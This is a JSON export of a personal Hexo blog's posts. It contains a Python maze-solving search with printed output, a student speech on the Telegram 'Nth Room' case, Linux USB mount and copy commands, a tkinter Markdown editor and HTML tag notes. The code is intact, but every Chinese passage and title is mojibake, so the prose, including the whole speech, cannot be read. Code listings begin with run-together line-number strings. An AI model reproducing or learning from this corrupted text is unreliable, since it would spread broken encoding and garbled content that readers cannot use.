123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapdef map_show(map1): for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)map_show(map1)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def route_trace(current,explored): while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = tracedef action(frontier,explored,current): for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y)))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) route_trace(current,explored) map_show(map1) break action(frontier,explored,current) if len(frontier) == 0: print(&quot;No result&quot;) break current = frontier[0] travel(map1,start) ç»“æœå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # Got it!# # # # # . . . . B # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # . # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # A . . . . . # # # # ç°åœ¨ï¼Œè¿™ä¸ªç¨‹åºå·²ç»èƒ½å¤Ÿæ‰¾å‡ºå„ç§è¿·å®«åœ°å›¾çš„è§£æ³•äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å¯¹åœ°å›¾è¿›è¡Œä¿®æ”¹ï¼Œç¨‹åºä¹Ÿèƒ½å¤Ÿæ­£å¸¸è¿è¡Œå¹¶è¾“å‡ºç›¸åº”ç»“æœï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å°†åœ°å›¾çš„å”¯ä¸€é“è·¯â€œå°æ­»â€ï¼Œé‚£ä¹ˆç»“æœå°±ä¼šæ˜¯â€œNo resultâ€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # # No result è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†å¯¹æ­¤æƒ…å¢ƒä¸‹ç›¸å…³ä»£ç çš„ç¼–å†™ã€‚ ä¿®æ”¹äº2021.04.11","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡º","slug":"çŸ¥è¯†è¾“å‡º","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]},{"title":"æ¥è‡ªç­çº§ç»„ç»‡æ¼”è®²çš„ä¸€ç¯‡æ¼”è®²ç¨¿","slug":"Speech","date":"2021-04-09T16:46:04.297Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2021/04/10/Speech/","link":"","permalink":"http://uniqueland.top/2021/04/10/Speech/","excerpt":"æ­£æ–‡åœ°ç‹±ç©ºè¡è¡ æ¶é­”åœ¨äººé—´ æƒ³å¿…åœ¨åº§å„ä½å¤šå°‘çœ‹è¿‡è¿™å¥è¯ï¼Œè¿™å°±æ˜¯æˆ‘ä»Šå¤©è¦è¯´çš„æœ‰å…³Telegram Nå·æˆ¿äº‹ä»¶çš„ä¸€äº›ä¸œè¥¿ï¼›ç”±äºæ¡ˆæƒ…å¤æ‚ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ï¼Œæœ‰å…´è¶£çš„è¯·è‡ªè¡Œç™¾åº¦ä¸»è¦äººç‰©ä»‹ç»ï¼š","text":"æ­£æ–‡åœ°ç‹±ç©ºè¡è¡ æ¶é­”åœ¨äººé—´ æƒ³å¿…åœ¨åº§å„ä½å¤šå°‘çœ‹è¿‡è¿™å¥è¯ï¼Œè¿™å°±æ˜¯æˆ‘ä»Šå¤©è¦è¯´çš„æœ‰å…³Telegram Nå·æˆ¿äº‹ä»¶çš„ä¸€äº›ä¸œè¥¿ï¼›ç”±äºæ¡ˆæƒ…å¤æ‚ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ï¼Œæœ‰å…´è¶£çš„è¯·è‡ªè¡Œç™¾åº¦ä¸»è¦äººç‰©ä»‹ç»ï¼šèµµä¸»å½¬ï¼šç°å¹´25å²ï¼Œä¿¡æ¯é€šä¿¡ä¸“ä¸šï¼Œæ›¾æ‹…ä»»å­¦æŠ¥ç¼–è¾‘éƒ¨ç¼–è¾‘ã€‚å¤šæ¬¡è·å¾—å¥–å­¦é‡‘ã€‚3å¹´å†…å‚åŠ äº†50å¤šæ¬¡å¿—æ„¿æ´»åŠ¨ã€‚å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªè¡¨é¢äººç•œæ— å®³çš„ä¼˜ç§€å­¦ç”Ÿï¼Œä¸»å¯¼äº†è¿™ä¹ˆä¸€èµ·äº‹ä»¶ã€‚å¯¹æ­¤äººè¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬ä¸éš¾å¾—å‡ºï¼šå¹³å°ç”¨telegramï¼Œäº¤æ˜“ç”¨æ¯”ç‰¹å¸ï¼Œè¯´æ˜ç½ªçŠ¯åä¾¦æŸ¥æ„è¯†é«˜ï¼Œæ€ç»´æ•æ·ï¼Œå¯ä»¥å½’ç±»ä¸ºé«˜æ™ºå•†ä¿¡æ¯çŠ¯ç½ªï¼›å†…å¿ƒè‡ªå‘ï¼Œä½†æ˜¯å¤–å›´æ€§æ ¼ç‰¹å¾è¡¨ç°ä¸ºè‡ªè´Ÿï¼Œå› æ— æ³•è¾¾åˆ°è‡ªèº«çš„é«˜åº¦é¢„æœŸéƒä¸å¾—å¿—ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ç¤¾ä¼šåè§ï¼Œæœ‰ä¸€å®šæ¦‚ç‡å‘å±•ä¸ºåç¤¾ä¼šå‹äººæ ¼ï¼›å¯èƒ½å­˜åœ¨å®¶åº­æš´åŠ›ï¼Œä¸”æ˜¯çˆ¶æƒå®¶åº­ï¼›ç¤¾äº¤èƒ½åŠ›è¾ƒå·®ï¼Œæ’æ–¥ç”šè‡³ä»‡è§†å¥³æ€§ï¼Œè¿™ç‚¹å¯ä»¥ä»ä»–åœ¨è¢«æ•åçš„è¨€è®ºå‘è¡¨çŸ¢å£ä¸è°ˆå¯¹å¥³æ€§çš„é“æ­‰è¿™ä¸€ç‚¹å¯ä»¥çœ‹å‡ºã€‚ æœ‰çš„å­©å­æ˜¯å­©å­ï¼Œæœ‰çš„å­©å­æ˜¯ç¦½å…½è¿™åå‡ å¹´éƒ½å¡äº†ä»€ä¹ˆè¿›è„‘å­é‡Œäººåä¸æ‰“ç ï¼Œé©¬èµ›å…‹åšé”™äº†ä»€ä¹ˆ å°±åƒè¿™äº›è¯„è®ºæ‰€è¡¨è¿°çš„ä¸€æ ·ï¼Œæˆ‘ä¹Ÿç—›æ¨è¿™äº›ç²¾è™«ä¸Šè„‘çš„ä¸œè¥¿ã€‚ä½†æ˜¯å‡ ä¹ä¸€è¾¹å€’çš„ç½‘ç»œèˆ†è®ºæ˜¾ç„¶æœ‰äº›é—®é¢˜ï¼šè¿™26ä¸‡äººä¸ªä¸ªéƒ½ç½ªè¯¥ä¸‡æ­»å—ï¼Ÿè€ƒè™‘åˆ°æ¶‰æ¡ˆäººæ•°åŠæ¡ˆä»¶çš„å¤æ‚ç¨‹åº¦ï¼Œæˆ‘ä¸ªäººè§‰å¾—å…¶ä¸­è¿˜æ˜¯ä¸ä¹è¢«æ•™å”†çš„ï¼Œå—è’™éª—çš„ï¼Œç”šè‡³ä¸æ˜æƒ…å†µçš„ã€‚ä¸æ˜¯è¯´å¼ºè¡Œæ´—ç™½ï¼Œè€Œæ˜¯æˆ‘è®¤ä¸ºæ¯ä¸ªäººçœ‹å¾…äº‹æƒ…éƒ½åº”è¯¥æœ‰è‡ªå·±çš„çœ‹æ³•ï¼Œæœ‰é‚£ç§ä¸è¢«èˆ†è®ºå¤§åŠ¿æ‰€åŠ¨æ‘‡çš„é‚£ç§çœ‹æ³•ã€‚å¤§å®¶æ˜¯å¦çœ‹è¿‡è¿™æ ·ä¸€ä¸ªæ¯”å–»ï¼šéŸ©å›½ç›®å‰åœ¨è¿è¥çš„å‡ºç§Ÿè½¦å¤§æ¦‚æœ‰26ä¸‡è¾†ï¼Œè¿™æ„å‘³ç€åœ¨éŸ©å›½çš„å¤§è¡—ä¸Šï¼Œé‡åˆ°Nå·æˆ¿ä¼šå‘˜å°±åƒé‡åˆ°å‡ºç§Ÿè½¦ä¸€æ ·é¢‘ç¹ã€‚ä¸çŸ¥å„ä½å¯¹è¿™ä¸ªæ¯”å–»æœ‰ä»€ä¹ˆçœ‹æ³•åœ¨æˆ‘çœ‹æ¥ï¼Œè¿™æ˜¯ä¸€ç§ä¸‹æ„è¯†çš„æƒ…æ™¯æç»˜ï¼Œæ—¨åœ¨æ”¾å¤§æ¡ˆä»¶æ¶‰åŠçš„èŒƒå›´ï¼Œè€Œè¿™ç§æƒ…æ™¯æç»˜äºæˆ‘æ¥çœ‹é™¤äº†æ”¾å¤§ææ…Œä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ï¼Œé‚£ä»–ä»¬è¿™ä¹ˆåšçš„ç›®çš„ä½•åœ¨å‘¢ï¼Ÿè¦æˆ‘è¯´è¦ä¸å°±æ˜¯å…¬ä¼—å·åšäººçœ¼çƒï¼Œè¦ä¸å°±æ¶‰åŠåˆ°é»‘å…¬å…³å¸¦èŠ‚å¥ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªå›½å®¶çº§çš„æ¡ˆä»¶ï¼Œæ¯”èµ·èƒŒåå¤§åˆ°ä»¤äººæ— æ³•æƒ³è±¡çš„é»‘ç°äº§ä¸šé“¾ï¼Œæˆ‘è¿˜æ˜¯æ›´å€¾å‘äºå‰è€…ã€‚ æœ€åï¼Œå¼•ç”¨äº†å‡ å¥æŸäº›å…¬ä¼—å·çš„è¯„ä»·ä½œä¸ºæˆ‘å¯¹æ­¤äº‹çš„çœ‹æ³•ï¼Œè¯å¾ˆç²—ï¼Œä½†ç†ä¸ç²—ï¼šä½œä¸ºä¸€ä¸ªæˆå¹´äººï¼Œè¦å­¦ä¼šå…‹åˆ¶ï¼Œä¸è¯¥é¦‹çš„ä¸è¦é¦‹ã€‚æˆ‘çŸ¥é“ç°åœ¨æ˜¯æ˜¥å¤©ï¼Œä½†åªæœ‰é‡ç‹—æ‰ä¸åˆ†åœºåˆã€ä¸åˆ†å¯¹è±¡ï¼Œæ—¶åˆ»æƒ³ç€äº¤é…ã€‚ä½•å†µï¼Œé‡ç‹—ä¹Ÿåªåœ¨æ˜¥ç§‹ä¸¤å­£æ‰å‘æƒ… è¡¥å……ç”±äºç­çº§ç»„ç»‡çš„æ¼”è®²é™æ—¶3åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä¸å¾—ä¸æŠŠåŸæœ¬ä¸€åƒå¤šå­—çš„æ¼”è®²ç¨¿åˆ ä¸º800å¤šå­—ï¼Œä¹Ÿå› æ­¤ç¼ºå¤±äº†å¾ˆå¤šäº‹ä»¶çš„ç»†èŠ‚åŠä¸ªäººçš„è§‚ç‚¹ã€‚â€“2020.05.07","categories":[],"tags":[]},{"title":"Linuxä¸‹åˆ©ç”¨å‘½ä»¤è¡Œå¯¹Uç›˜å’Œç”µè„‘ä¸­çš„æ–‡ä»¶è¿›è¡Œæ“ä½œ","slug":"Operations between flash disk and linux os","date":"2021-04-09T16:46:04.296Z","updated":"2020-11-10T03:52:41.832Z","comments":true,"path":"2021/04/10/Operations between flash disk and linux os/","link":"","permalink":"http://uniqueland.top/2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/","excerpt":"","text":"123456fdisk -l #æŸ¥çœ‹æ¥å…¥è®¾å¤‡åç§°mount /dev/sda1 /mnt #æŒ‚è½½Uç›˜ls /mnt #æŸ¥çœ‹Uç›˜æ–‡ä»¶cp file directory #å¤åˆ¶æŒ‡å®šæ–‡ä»¶fileè‡³æŒ‡å®šç›®å½•directoryls /mnt #å†æ¬¡æŸ¥çœ‹Uç›˜æ–‡ä»¶umount /mnt #å¸è½½Uç›˜ æ ‡é¢˜ï¼ˆå¯é€‰ï¼‰æç¤ºï¼šè‹¥æ“ä½œä¸­å‡ºç°é”™è¯¯ï¼Œè¯·æŸ¥çœ‹æƒé™æ˜¯å¦æ­£ç¡®ï¼Œæˆ–åœ¨æ¯æ¬¡æ“ä½œå‰åŠ â€™sudoâ€™cpåçš„æ–‡ä»¶å’Œè·¯å¾„éœ€å¸¦è·¯å¾„(ä¸ªäººæ¨èç»å¯¹è·¯å¾„)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Markdown_Editor V1.0","slug":"Markdown_Editor V1.0","date":"2021-04-09T16:46:04.295Z","updated":"2020-11-10T02:56:29.631Z","comments":true,"path":"2021/04/10/Markdown_Editor V1.0/","link":"","permalink":"http://uniqueland.top/2021/04/10/Markdown_Editor%20V1.0/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556\\# -*- coding=utf-8 -*- import tkinterimport osfrom tkinter import filedialogwin_size=&#x27;450x550&#x27;win = tkinter.Tk()win.geometry(win_size)win.title(&#x27;Markdown Editor V1.0 (hexo only)&#x27;)def processandsave(): contents = &#x27;---\\ntitle:&#x27; + title.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;tags:&#x27; + tags.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;---\\n&#x27; + content.get(&#x27;0.0&#x27;,&#x27;end&#x27;) filename = filedialog.asksaveasfilename() if filename is not None: with open(file=filename,mode=&#x27;w&#x27;) as file: file.write(str(contents)) title.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) tags.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) content.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)def add_bash(): add_content=add_bash_text.get(&#x27;0.0&#x27;,&#x27;end&#x27;) add_content=add_content.rstrip() changing_content=&#x27;```bash\\n&#x27;+add_content+&#x27;\\n```\\n&#x27; content.insert(&#x27;end&#x27;,changing_content) add_bash_text.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)label1=tkinter.Label(text=&#x27;æ ‡é¢˜&#x27;,padx=10,pady=10)label1.grid(row=0,column=0)title=tkinter.Text(width=40,height=2)title.grid(row=0,column=1,columnspan=2)label2=tkinter.Label(text=&#x27;æ ‡ç­¾&#x27;,padx=5,pady=5)label2.grid(row=1,column=0)tags=tkinter.Text(width=30,height=1)tags.grid(row=1,column=1)label3=tkinter.Label(text=&#x27;æ­£æ–‡&#x27;,padx=5,pady=5)label3.grid(row=2,column=0)content=tkinter.Text(width=40,height=20)content.grid(row=2,column=1,rowspan=5)add_bash_button=tkinter.Button(win,text=&#x27;å‘½ä»¤è¡Œ&#x27;,command=add_bash)add_bash_button.grid(row=9,column=0)add_bash_text=tkinter.Text(width=40,height=5)add_bash_text.grid(row=9,column=1)save_button=tkinter.Button(win,text=&#x27;ä¿å­˜&#x27;,command=processandsave)save_button.grid(row=8,column=1)win.mainloop()","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Thanksgiving","slug":"img_share","date":"2021-04-09T16:46:04.294Z","updated":"2020-11-28T16:15:08.320Z","comments":true,"path":"2021/04/10/img_share/","link":"","permalink":"http://uniqueland.top/2021/04/10/img_share/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"HTMLç¬”è®°","slug":"HTML_notes","date":"2021-04-09T16:46:04.293Z","updated":"2021-01-18T15:02:48.534Z","comments":true,"path":"2021/04/10/HTML_notes/","link":"","permalink":"http://uniqueland.top/2021/04/10/HTML_notes/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811 &lt;h1&gt; to &lt;/h6&gt;: ä¸€åˆ°å…­å·æ ‡é¢˜2 &lt;p&gt;æ®µè½&lt;/p&gt;3 &lt;body style=&quot;background-color:PowderBlue;&quot;&gt; &lt;p style=&quot;font-family:verdana;color:red&quot;&gt;å¯¹æ®µè½æ ·å¼è¿›è¡Œä¿®æ”¹&lt;/p&gt; &lt;/body&gt;4 &lt;br /&gt;&lt;hr /&gt;&lt;!è¿™æ˜¯æ³¨é‡Šï¼Œå‰é¢çš„æ˜¯æ¢è¡Œå’Œåˆ†å‰²çº¿&gt;5 &lt;b&gt;è¢«åŠ ç²—çš„å†…å®¹&lt;/b&gt;6 &lt;strong&gt;è¢«...åŠ ç²—çš„å†…å®¹...å§&lt;/strong&gt;7 &lt;big&gt;è¢«åŠ å¤§çš„å†…å®¹&lt;/big&gt;8 &lt;em&gt;è¢«å¼ºè°ƒ(åŠ æ–œ)çš„å†…å®¹&lt;/em&gt;9 &lt;i&gt;è¢«...æ„å¤§åˆ©å¼åŠ æ–œçš„å†…å®¹&lt;/i&gt;10 &lt;small&gt;è¢«å‡å°çš„å†…å®¹&lt;/small&gt;11 &lt;sub&gt;ä½äºå³ä¸‹è§’çš„å°å­—éƒ¨åˆ†&lt;/sub&gt;12 &lt;sup&gt;ä½äºå³ä¸Šè§’çš„å°å­—éƒ¨åˆ†&lt;/sup&gt;13 &lt;pre&gt;é¢„æ ¼å¼æ–‡æœ¬(ä¿ç•™äº†ç©ºæ ¼å’Œæ¢è¡Œ)&lt;/pre&gt;14 &lt;code&gt;ç”¨äº&lt;/code&gt;,&lt;kbd&gt;æ˜¾ç¤º&lt;/kbd&gt;,&lt;samp&gt;ä»£ç &lt;/samp&gt;,&lt;var&gt;è¿™ä¸ªåŠ å¤§åŠ ç²—äº†ä¸€ç‚¹&lt;/var&gt;15 &lt;address&gt;ç”¨äºä¹¦å†™åœ°å€ï¼Œå…¶ä¸­è®°å¾—æ‰‹åŠ¨æ·»åŠ æ¢è¡Œæ ‡ç­¾&lt;/address&gt;16 &lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;17 &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;18 &lt;bdo dir=&quot;rtl&quot;&gt;å°æ‰“åºå€’&lt;/bdo&gt;19 &lt;blockquote&gt;å—å¼•ç”¨&lt;/blockquote&gt;,&lt;q&gt;çŸ­å¼•ç”¨&lt;/q&gt;20 &lt;p&gt;ä½ çœ‹&lt;del&gt;æˆ‘è¢«åˆ’æ‰äº†&lt;/del&gt;&lt;ins&gt;åˆè¢«åŠ ä¸‹åˆ’çº¿äº†&lt;/ins&gt;&lt;/p&gt;21 &lt;a name=&quot;tips&quot;&gt;åŸºæœ¬çš„æ³¨æ„äº‹é¡¹ - æœ‰ç”¨çš„æç¤º&lt;/a&gt; &lt;a href=&quot;#tips&quot;&gt;æœ‰ç”¨çš„æç¤º&lt;/a&gt;22 &lt;img src=&quot;url&quot; width=xx height=xx align=xxx /&gt;23 &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;24 &lt;ul&gt;&lt;!unsorted list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ul&gt;25 &lt;ol&gt;&lt;!ordered list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ol&gt;26 &lt;dl&gt;&lt;!defined list&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;dd&gt;Black hot drink&lt;/dd&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;White cold drink&lt;/dd&gt; &lt;/dl&gt;27 &lt;head&gt; &lt;style&gt; .cities &#123; background-color:black; color:white; margin:20px; padding:20px; &#125; &lt;/style&gt; &lt;/head&gt;28 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; span.red &#123;color:red;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My &lt;span class=&quot;red&quot;&gt;Important&lt;/span&gt; Heading&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;29 &lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;30 &lt;body background=&quot;http://www.w3school.com.cn/clouds.gif&quot;&gt;31 &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello World!&quot;) &lt;/script&gt; &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt; Quick Search","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"0","slug":"0","date":"2020-03-22T09:06:28.000Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2020/03/22/0/","link":"","permalink":"http://uniqueland.top/2020/03/22/0/","excerpt":"","text":"Hello,Worldï¼è¯´äººè¯ æˆ‘ç»ˆäºæœ‰è‡ªå·±çš„ç½‘ç«™å•¦ è™½ç„¶åªæ˜¯éƒ¨ç½²åœ¨githubä¸Šçš„å…ˆåšä¸ªæµ‹è¯• ä¸‹å›åœ¨çœ‹çœ‹è¦å¼„å•¥peach..å•Šä¸â€¦peaceï½ï½","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"},{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"},{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"},{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"},{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"},{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"},{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"},{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"},{"name":"ctfã€web","slug":"ctfã€web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"},{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"},{"name":"çŸ¥è¯†è¾“å‡º","slug":"çŸ¥è¯†è¾“å‡º","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]}